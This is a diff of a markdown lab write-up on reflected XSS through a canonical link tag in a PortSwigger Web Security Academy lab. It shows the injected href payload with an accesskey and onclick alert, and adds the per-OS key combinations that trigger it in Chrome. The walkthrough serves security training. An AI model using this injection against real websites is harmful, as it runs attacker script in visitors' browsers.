@@ -1,6 +1,4 @@
-# Reflected XSS in canonical link tag
-
-
+# Reflected XSS in canonical link tag | Dec 31, 2022
 
 ## Introduction
 
@@ -49,6 +47,14 @@ In here, we can see that there is a `<link>` tag is using **canonical** link tag
 ```html
 <link rel="canonical" href='https://0a2200b504a6441cc040ccd100c20002.web-security-academy.net/?'accesskey='x'onclick='alert(document.domain)'/>
 ```
+
+**Now press:**
+
+- On Windows: `Alt + Shift + x`
+- On MacOS: `Ctrl + Alt + x`
+- On Linux: `Alt + x`
+
+> Note: It only works in Chrome browser.
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-20/images/Pasted%20image%2020221231084750.png)
 
